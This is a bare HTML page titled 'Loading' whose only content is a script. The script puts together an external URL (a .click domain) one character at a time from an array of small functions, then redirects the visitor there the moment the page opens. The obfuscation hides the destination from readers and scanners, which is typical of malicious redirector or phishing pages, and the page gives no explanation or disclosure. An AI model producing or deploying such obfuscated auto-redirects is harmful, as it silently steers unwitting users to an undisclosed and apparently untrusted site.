<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            () => 't',
            _ => 't',
            function() { return 'p'; },
            function() { return 's'; },
            _ => ':',
            function() { return '/'; },
            () => '/',
            _ => 'v',
            _ => 'e',
            () => 'r',
            _ => 'g',
            () => 'e',
            function() { return 'n'; },
            function() { return '.'; },
            _ => 'c',
            function() { return 'l'; },
            function() { return 'i'; },
            () => 'c',
            () => 'k',
            () => '/',
            () => 's',
            () => '/',
            _ => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
